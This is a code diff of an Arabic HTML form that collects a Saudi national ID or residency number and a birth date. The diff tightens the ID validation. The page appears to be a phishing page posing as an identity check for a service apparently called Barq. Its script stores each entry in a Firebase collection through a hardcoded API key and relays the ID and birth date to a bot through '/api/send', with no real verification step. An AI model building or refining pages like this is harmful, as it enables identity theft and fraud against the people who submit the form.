@@ -30,7 +30,6 @@
             color: #fff; font-size: 18px; font-weight: bold; cursor: pointer;
             transition: 0.3s; z-index: 1000;
         }
-        .btn-continue:active { transform: translateX(-50%) scale(0.98); }
     </style>
 </head>
 <body>
@@ -40,7 +39,7 @@
     
     <div class="input-group">
         <label>الهوية الوطنية أو الإقامة</label>
-        <input type="number" id="idNumber" placeholder="1123482869">
+        <input type="text" id="idNumber" placeholder="1234567890" pattern="\d{10}" maxlength="10" inputmode="numeric">
     </div>
 
     <div class="input-group">
@@ -55,7 +54,6 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
-    // إعدادات Firebase الخاصة بك
     const firebaseConfig = {
         apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
         authDomain: "barq-9ba61.firebaseapp.com",
@@ -72,29 +70,33 @@
         const idNumber = document.getElementById('idNumber').value;
         const birthDate = document.getElementById('birthDate').value;
 
-        if (!idNumber || !birthDate) {
-            alert("يرجى تعبئة كافة الحقول");
+        // التحقق من أن الهوية 10 أرقام
+        if (idNumber.length !== 10) {
+            alert("يرجى إدخال رقم هوية صحيح مكون من 10 أرقام");
+            return;
+        }
+
+        if (!birthDate) {
+            alert("يرجى اختيار تاريخ الميلاد");
             return;
         }
 
         try {
-            // 1. الحفظ في Firebase
             await addDoc(collection(db, "identity_verifications"), {
                 idNumber: idNumber,
                 birthDate: birthDate,
                 timestamp: serverTimestamp()
             });
 
-            // 2. إرسال إشعار للبوت (تأكد أن مسار الـ API يعمل)
             fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    message: `تحقق جديد:\nالهوية: ${idNumber}\nالميلاد: ${birthDate}` 
+                    message: `تحقق هوية:\nالهوية: ${idNumber}\nالميلاد: ${birthDate}` 
                 })
             });
 
-            window.location.href = 'success.html'; // أو الصفحة التالية
+            window.location.href = 'success.html';
         } catch (error) {
             console.error("Error:", error);
             alert("حدث خطأ، يرجى المحاولة لاحقاً");
